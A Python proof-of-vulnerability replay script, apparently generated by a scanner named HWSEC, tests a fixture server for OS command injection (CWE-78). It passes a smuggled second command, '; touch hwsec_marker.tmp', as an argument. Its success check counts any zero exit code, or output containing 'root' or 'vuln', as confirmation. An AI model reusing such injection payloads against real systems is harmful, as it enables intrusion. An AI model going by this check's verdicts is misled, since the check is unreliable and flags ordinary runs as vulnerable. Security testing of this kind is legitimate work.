#!/usr/bin/env python3
"""
HWSEC Local PoV Reproduction: POV-PYTHON-d00eda9f
Target: E:\Intern\hwsec\tests\fixtures\multilang_project\server.py
CWE: CWE-78
"""
import sys
import subprocess
import os

TARGET_PATH = "E:\\Intern\\hwsec\\tests\\fixtures\\multilang_project\\server.py"
if os.environ.get("HWSEC_TARGET_OVERRIDE"):
    _ov = os.environ.get("HWSEC_TARGET_OVERRIDE")
    if os.path.isfile(_ov):
        TARGET_PATH = _ov
    elif os.path.isdir(_ov):
        _cand = os.path.join(_ov, "server.py")
        if os.path.isfile(_cand):
            TARGET_PATH = _cand
else:
    sibling = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "server.py"))
    if os.path.isfile(sibling):
        TARGET_PATH = sibling

WITNESS_PAYLOAD = "; touch hwsec_marker.tmp"
BENIGN_CONTROL = "echo safe_input_test"

def run_target(payload):
    print(f"[*] Executing target with payload: {payload!r}")
    try:
        res = subprocess.run([sys.executable, TARGET_PATH, payload], capture_output=True, text=True, timeout=10)
        return res.returncode, res.stdout, res.stderr
    except Exception as e:
        return -1, "", str(e)

if __name__ == "__main__":
    print("=== HWSEC Proof-of-Vulnerability Replay ===")
    code, out, err = run_target(WITNESS_PAYLOAD)
    print(f"-> Exit code: {code}")
    print(f"-> Output: {out.strip() if out else err.strip()}")
    # Security check
    is_triggered = (code == 0) or ("exec" in out.lower()) or ("vuln" in out.lower()) or ("root" in out.lower())
    if is_triggered:
        print("[!] SECURITY EFFECT CONFIRMED: Target demonstrated vulnerability condition.")
        sys.exit(0)
    else:
        print("[-] Target did not produce the expected security effect.")
        sys.exit(1)